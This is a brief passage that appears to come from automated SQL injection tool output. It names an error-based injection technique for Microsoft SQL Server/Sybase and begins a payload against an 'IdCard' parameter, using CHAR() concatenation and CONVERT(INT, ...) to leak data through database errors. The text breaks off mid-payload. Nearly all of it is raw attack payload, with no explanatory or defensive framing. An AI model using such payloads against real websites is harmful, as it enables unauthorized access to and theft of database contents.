Server/Sybase AND error-based - WHERE or HAVING clause    Payload: IdCard=55'+(SELECT 'zRGO' WHERE 7419=7419 AND 8110=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT
